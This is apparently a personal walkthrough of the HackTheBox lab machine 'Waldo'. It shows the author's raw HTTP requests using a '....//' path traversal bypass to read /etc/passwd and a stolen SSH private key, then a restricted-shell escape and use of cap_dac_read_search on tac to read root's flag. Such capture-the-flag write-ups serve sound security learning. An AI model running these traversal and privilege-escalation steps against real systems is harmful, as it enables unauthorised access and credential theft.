# HackTheBox - Waldo

This is the box where I learned not to ignore things...

Started this box off in the normal way, which we'll get to in a second, but then went down a rabbit hole and wasted lots of time when I could have made significant progress by not ignoring something that was staring me right in the face. 

## Starting off

As with all these HTB machines, we start with an `nmap` scan to determine where to focus our attention.

I run the following on most of these boxes and it seems to get me some pretty solid results:

```
nmap -sC -sV --top-ports 10000 -vvv -n -O 10.10.10.87 -oA Waldo
```

- `sC` Default scripts
- `sV` Service verification
- `top-ports 10000` actually truncated to 8306(or there abouts) 
- `vvv` very very verbose
- `n` no DNS resolution
- `O` OS Verification
- `oA` output all formats

We got some results back pretty quickly from this scan, we'll take a look at each one and see what's what. I've output the results as the grepped version below:

```
Host: 10.10.10.87 ()    
Ports: 
22/open/tcp//ssh//OpenSSH 7.5 (protocol 2.0)/, 
80/open/tcp//http//nginx 1.12.2/, 
8888/filtered/tcp//sun-answerbook///    
Ignored State: closed (8303)
```

First one I checked out was the outlier, 8888 (also because it registered as "filtered" which always denotes a manual verification), but it proved to be a false positive, or at least I wasn't hitting it in the correct way. So, we'll move onto the other two ports, 22, and 80. 

Starting with port 80, the NginX webserver, we'll head over and check out the website that's running there (and while we're at it we'll run a `dirb` scan).

Hitting the index page of the website we can immediately see why this machine is called "Waldo", as we see (or rather we don't see) the titular character of the childrens books plastered all over the place, even our mouse is replaced, which takes me back to the days of GeoCities. While the `dirb` scan finishes up we'll run BurpSuite and intercept our first request again, just to see if anything is going on... Which is where we find our first potential vulnerability :) 

```
POST /dirRead.php HTTP/1.1
Host: 10.10.10.87
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.87/list.html
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
Connection: close
Cache-Control: max-age=0

path=./.list/
```

This just popped up after the inital request, and that `path=` parameter looks suspect as hell.

Looking at the response in BurpSuite we can clearly see what looks like a JSON response with some "lists" in it

```
HTTP/1.1 200 OK
Server: nginx/1.12.2
Date: Tue, 14 Aug 2018 20:44:38 GMT
Content-Type: application/json
Connection: close
X-Powered-By: PHP/7.1.16
Content-Length: 34

[".","..","list1","list2","list3"]
```

The "list" entries are the things we can see on the main page, but the first two look suspiciously like UNIX file paths. The first "." being the working directory, and the second ".." is the parent folder, or at least that's the way it is on a UNIX system, so we might have an LFI here. 

Yup, we have an LFI. 

Removing the `.list/` part gives us much more output, and it appears as though we're looking at the web root.

```
HTTP/1.1 200 OK
Server: nginx/1.12.2
Date: Tue, 14 Aug 2018 20:54:42 GMT
Content-Type: application/json
Connection: close
X-Powered-By: PHP/7.1.16
Content-Length: 155

[".","..",".list","background.jpg","cursor.png","dirRead.php","face.png","fileDelete.php","fileRead.php","fileWrite.php","index.php","list.html","list.js"]
```

OK, so confirmed LFI, and we have something to go off in terms of file names, so lets try and pull some out.

```
POST /dirRead.php HTTP/1.1
Host: 10.10.10.87
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.87/list.html
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Connection: close

path=./.fileDelete.php
```
Sending that request gave the following output.

```
HTTP/1.1 200 OK
Server: nginx/1.12.2
Date: Tue, 14 Aug 2018 20:57:33 GMT
Content-Type: application/json
Connection: close
X-Powered-By: PHP/7.1.16
Content-Length: 5

false
```

But that's kind of expected, if we look at the files that are listed above we can see one called 'fileRead.php', so we should probably try to use that one instead of 'dirRead.php' which reads the directory, hints in the name. 

Firing the same response as before but changing the URL to 'fileRead.php' generates the following:

```
HTTP/1.1 200 OK
Server: nginx/1.12.2
Date: Tue, 14 Aug 2018 21:10:19 GMT
Content-Type: application/json
Connection: close
X-Powered-By: PHP/7.1.16
Content-Length: 14

{"file":false}
```

File is false... but we looked for 'path' because we're lazy... so let's change the POST request to 'file' and see if that makes a difference. 

```
POST /fileRead.php HTTP/1.1
Host: 10.10.10.87
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.87/list.html
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Connection: close

file=fileDelete.php
```

Yup! :) 

```
HTTP/1.1 200 OK
Server: nginx/1.12.2
Date: Tue, 14 Aug 2018 21:13:22 GMT
Content-Type: application/json
Connection: close
X-Powered-By: PHP/7.1.16
Content-Length: 534

{"file":"<?php\n\nif($_SERVER['REQUEST_METHOD'] === \"POST\"){\n\tif(isset($_POST['listnum'])){\n\t\theader('Content-Type: application\/json');\n\t\tif(is_numeric($_POST['listnum'])){\n\t\t\t$myFile = \"\/var\/www\/html\/.list\/list\" . $_POST['listnum'];\n\t\t\tunlink($myFile);\n\t\t\theader('Content-Type: application\/json');\n\t\t\techo '[true]';\n\t\t}else{\n\t\t\theader('Content-Type: application\/json');\n\t\t\techo '[false]';\n\t\t}\n\t}else{\n\t\theader('Content-Type: application\/json');\n\t\techo '[false]';\n\t}\n}\n"}
```

OK, so we can read files in the current directory, but can we read anything on the rest of the system? 

Using basic file traversal tricks doesn't seem to work ("../../../"), so the application must be doing some form of escaping. 

Let's take a look at 'fileRead.php' see if we can find a flaw in the code. First we'll have to clean the '\n' characters, which is a simple python script away:

```
string = "big long php string wrapped in json"
print string.replace("\n", "\n")
```

Much better. 

OK, so it looks like there is some escaping happening, it's hard to follow, but the crux of it boils down to "../" being escaped, so we need to play around with dots and slashes until we can get access to something interesting. Oh we also got confirmation of where we are in the system (/var/www/html), which is nice.

Took a few minutes re-reading the code to work out that we need to do "....//" in order to get our directory traversal working properly.

Using that we can read /etc/passwd, and work out some users. 

## The Rabbit Hole

So this is where I made my mistake, I decided to stop playing on the webserver and move onto the SSH, which in hindsight was a bit of a waste as there is something a lot more obvious lurking on the webserver still, which I've neglected to mention, but you might have noticed. 

'fileWrite.php'

*sigh* 

I should have taken a look at this, because we already have directory traversal, it stands to reason that we probably have some way of writing a file. 

## Back to the Box

Let's take a look at 'fileWrite.php' then shall we.

Clean it up first, because this JSON encoding makes it hard to read. There doesn't appear to be an encoding or escaping other than the JSON, so it looks like we can just write directly to the folder?

Let's setup a python server see if we can't get a ping back for an upload. 

Nope. So we'll have to do it the regular way. (in hindsight it was pretty obvious that this wasn't going to work)

## Another Rabbit Hole and a Lack of Recon

So I just noticed, after playing around with the 'fileWrite.php' in Repeater, that I hadn't played with it on the site at all. So lets quickly look at that. 

OK, so the website has some user input, we can create a new list, and add items to it. 

Now if we go back to the 'fileWrite.php' we can see that it's looking for another parameter. 'listnum'

So let's try sending some text up with the a 'listnum' value.

OK, so that seems to work, we get a "true" now instead of a false, so let's check on the `dirRead` function again to see if we managed to get something uploaded (I don't think we did, but let's check anyway)

The answer is an expected, and resounding, no. We didn't get the upload that time, so we need to figure out how to get something into those lists. We know we can add a 'listnum' value and it appears to work, so now we just need the other parameter. And looking back over the 'fileWrite.php' we can see that the second parameter is `data` so we'll give that a try with some text, see what happens.

```
listnum=10&data=This is some data
```

OK, so that was interesting, it looks like it accepted that string, but it appears to have broken the "list" when we browse to it using Firefox. We can no longer "add". So we should probably see if we can get some form of reflection before we go any farther.

```
listnum=11&data=<?php echo "Butts and stuff"; ?>
```

Yes I am actually a mature adult thanks for asking.

OK, so that doesn't appear to echo back at us... Let's try something else. 

> Note: this next part is written a few days later, I went back to the website with a fresh head and spotted something interesting. 

If we look at `fileRead.php` we can see that it isn't doing much in the way of checking our input... so what happens if we try some directory traversal and see what we can't look at?

```
POST /fileRead.php HTTP/1.1
Host: 10.10.10.87
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.87/list.html
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Connection: close

file=....//....//....//etc/passwd
```

I used `....//` as the path based on the "escaping" being done in the code (if you use `fileRead` to read the `fileRead` code you'll see what I mean)

And BOOM, we have directory traversal! And of course the usual bounty of information that comes with popping `/etc/passwd` such as users and login capabilities. 

Let's have a look in the users home folder with `dirRead.php` (which at this point I'm assuming has the same issue)

```
POST /dirRead.php HTTP/1.1
Host: 10.10.10.87
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.87/list.html
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Connection: close

path=....//....//....//etc/
```

Game on. 

Chaning `/etc` for `/home` gave the following output:

```
HTTP/1.1 200 OK
Server: nginx/1.12.2
Date: Sun, 19 Aug 2018 17:42:50 GMT
Content-Type: application/json
Connection: close
X-Powered-By: PHP/7.1.16
Content-Length: 19

[".","..","nobody"]
```

So we know we're the `nobody` user, and based on the output of `/etc/passwd` earlier we also know that `nobody` actually has a terminal to log in to. 

```
path=....//....//....//home/nobody
```

```
[".","..",".ash_history",".ssh",".viminfo","user.txt"]
```

OK, so we could grab `user.txt` right now if we wanted to. But let's take a look in that `.ssh` folder.

Inside there we can see a file called `.monitor` which, if we read it using the ever handy `fileRead.php` reveals what looks to be a private RSA key. So let's clean it up and see if we can use it to log in!

Copy and paste everything that isn't JSON into `vim` and we can clean this up with two short commands. 

In command mode `:` issue the following commands:

`%s/\\n/\r/g`

Then.

`%s/\\//g`

Now give that a save, and then change the permissions on the file to 0600 (`chmod 0600 <rsa_key>`)

```
ssh -i whatever_you_saved_the_rsa_key_as nobody@10.10.10.87
```

Oh look, that worked! :) 

Now this next bit took me a while, but it was worth it because I learned a lot. Instead of telling all about my mistakes, I'll skip to the parts where I got wins, because it'll speed up the rest of this blog :) 

We'll skip the normal enum, do a `cat` on `/proc/cgroups`.

You see that? 

That means we're in a docker image... dun dun duuuun! How will we ever escape?!

Well, if we run a `ps aux` we can see that the `ssh` daemon is running, so let's take a look at the `/etc/ssh/sshd_config` and see if we can spot anything in there that'll point us in the right direction. 

Reading through that we can see the following (amongst other things):

```
ChallengeResponseAuthentication no
AllowUsers nobody
```

To me, that says "don't ask for a password from the `nobbody` user", so that's the theory we're pushing forwards with.

And if we stop for a second, and take stock of who we are, and how we got in, then we realise the "breakout" is staring us in the face. 

> Hint: we got in using someone elses private key

We can also see that something is listening on `localhost` if we run `netstat -tnlp`

So let's try:

`ssh -i .ssh/.monitor monitor@localhost`

Swish, we're in... to another restricted environment. 

I won't daudle on this one, there are 4 progams you can potentially use to break out of `rbash` (which is the restricted version of `bash`), think old school :) 

> If you need an even bigger hint, think what people used before proper text editors were a thing.

Once we have a more effective shell we can start doing some proper Enumeration. 

Looking around the users home folder we can see two folders, the `bin` folder we were supposed to use, and something called `app-dev` which we'll get to in a moment. 

First off let's sort our `$PATH` out because calling things by their full pathname is a pain.

```
PATH=$PATH:/bin:/usr/bin:/sbin:/usr/sbin
```
Cool, now we can actually call things directly. 

## The Rabbit Hole Deepens

So, for those of you keeping track, we're actually three shells deep into this box.

1. Our initial `ssh` connection
2. The "docker breakout" 
3. The restricted shell breakout

Which is fun. 

Looking around in `app-dev` we can see a whole bunch of files that look really interesting, including a `bash` script called `restrictScript.sh` which appears to do magic? (I'll get to that shortly), we also have some C code, and the results of the C code being compiled (a bunch of .h and ELF files).

I'm going to skip a bit of enum here because I fell waaaay down into a Rabbit hole. My advice is to read everything you can in the folders you have access to, 

```
/file#!/bin/bash

fullPath=$1
file=$(/usr/bin/basename $1)
magic=$(/usr/bin/xxd -p -l 4 $fullPath)
fileHash=$(/usr/bin/shasum $fullPath | /usr/bin/cut -d " " -f1)
backupHash=$(/usr/bin/shasum ${fullPath}.bak | /usr/bin/cut -d " " -f1)

#if executable is corrupted replace it with know good
if [ $fileHash != $backupHash ]
then
        tmpFile=$(/bin/mktemp)
        /bin/chmod u+x $tmpFile
        /bin/cp $fullPath $tmpFile
        /bin/cp ${fullPath}.bak $fullPath
        file=$tmpFile

        (/bin/sleep .5; /bin/rm -f $tmpFile) &

fi

if [ $magic = "7f454c46" ]
then
        $file $2
else
        read -r shebang < $fullPath
        if [ ${shebang:0:2} = "#!" ]
        then
                case ${shebang:2} in
                        */bin/bash*|*/bin/sh*|*/bin/dash*) set -r; source $file ;;
                        *) echo "-rbash: $file: bad interpreter: ${shebang:2}: no such file or directory" ;;
                esac
        fi
fi
```

I mapped out this whole script on paper trying to get my head around it.

Specifically because of that last part inside the `case` statement:

`source $file` 

For those of you who don't know, `source` basically runs things.

If you write a quick `bash` script like:

```
#!/bin/bash
echo "Hello World"
```

Save it (even as just a text file) and give it to `source` it'll be executed. So I think you'll forgive me for thinking this was the key to getting a root shell. 

Alas, it was not.

The key to root on this machine lies in something I have only just discovered. And it took what I thought was a shitty remark to actually give me the nudge to move away from that `restrictScript.sh`.

> "Only capable and potent hackers can find out why"

I thought that was just someone being a dick. Turns out it was an awesome hint (shoutout to the forum user on HTB who left it)

Look at the `capabilities` of the files. 

OK, this one needs some explaining. 

If you run `./logMonitor -s` or `./logMonitor -a` you'll get an error message. 

Now, cd into the `v1.0` folder and try the same thing with the binary in there. 

See how it works now? To check why it's doing that, we can use something called `getcap`

What this is going to do is pull out some seriously magical values from the crazy land of Linux. 

If we run `getcap logMonitor-0.1` we get a rather interesting result. 

```
logMonitor-0.1 = cap_dac_read_search+ei
```

"cap_dac_read_search+ei"

What the hell is that?

Well, if we consult `man capabilties` we can see a *super* interesting entry with regards to that particular parameter. 

```
       CAP_DAC_READ_SEARCH
              * Bypass file read permission checks and directory read and execute permission checks;
              * invoke open_by_handle_at(2);
              * use the linkat(2) AT_EMPTY_PATH flag to create a link to a file referred to by a file descriptor.
```

Bypass you say? Inherited capabilities you say (I didn't include that bit for the sake of brevity, but if you look into the use of `+ei` you'll see what I mean)? Sign me the hell up!

Unfortunately, we can't use this particular binary to do anything interesting, other than check out some of the log files that we wouldn't normally have access to (which is kind of cool, I guess). 

If we run `getcap` with no file input, we can see the usage hint. And it contains my favourite flag of all flags... `-r` recursive. We can use this sucker to search for things!!! :D 

Didn't take long to work out the correct way to do a full search of the system. 

```
getcap -r / 2>/dev/null
```

And that gave up two results. 

```
monitor@waldo:/$ getcap -r / 2>/dev/null                                                                                                                          
/usr/bin/tac = cap_dac_read_search+ei
/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
```

Remember that glorious word from just a few moments ago... Bypass.

`/usr/bin/tac /root/root.txt`

*Sirens in distance*

Jobs a good'un, see ya next time on "chasing ones tail"

> After-thought: I would be very interested to see if there was a way to get a proper root shell on this machine, rather than just have the ability to read files as root. Which, while cool, is not a root shell.

HG/